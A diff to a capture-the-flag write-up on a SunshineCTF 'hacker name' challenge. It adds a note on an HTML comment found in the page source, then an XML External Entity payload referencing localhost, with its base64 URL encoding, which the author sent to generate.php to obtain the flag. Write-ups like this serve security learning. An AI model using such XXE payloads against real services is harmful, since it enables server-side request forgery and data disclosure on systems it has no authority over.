@@ -26,6 +26,14 @@ document.getElementById("button").onclick = function() {
 };
 ```
 
+Similarly, examining the source code of the result page (second screenshot) yielded this interesting comment: 
+
+```
+<!--hacker name functionality coming soon!-->
+<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
+<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
+```
+
 Immediately, I thought about exploiting the common XXE (XML External Entity) vulnerability. Rather than entering the XML exploit into the input element of the website, I tried passing the XML string drectly into the URL `http://ng.sunshinectf.org/generate.php?input=[XML]`.
 
 The XML object format was this:
@@ -37,3 +45,19 @@ The XML object format was this:
   <lastName>lastName</lastName>
 </input>
 ```
+
+Encoded into a URL safe base-64 string, this XML object became this: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz4KPGlucHV0PgogIDxmaXJzdE5hbWU%2BZmlyc3ROYW1lPC9maXJzdE5hbWU%2BCiAgPGxhc3ROYW1lPmxhc3ROYW1lPC9sYXN0TmFtZT4KPC9pbnB1dD4%3D`
+
+
+```xml
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "http://localhost/generate.php" > ]>
+<input>
+  <firstName>Kim</firstName>
+  <lastName>&xxe;</lastName>
+</input>
+```
+
+Whhich was translated into this string: `PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnPz48IURPQ1RZUEUgZXJudyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly9sb2NhbGhvc3QvZ2VuZXJhdGUucGhwIiA%2BIF0%2BPGlucHV0PjxmaXJzdE5hbWU%2BS2ltPC9maXJzdE5hbWU%2BPGxhc3ROYW1lPiZ4eGU7PC9sYXN0TmFtZT48L2lucHV0Pg%3D%3D`, which passed to the /generate.php page yielded the flag:
+
+![Screenshot](/ctf/images/pic5.png?raw=true)
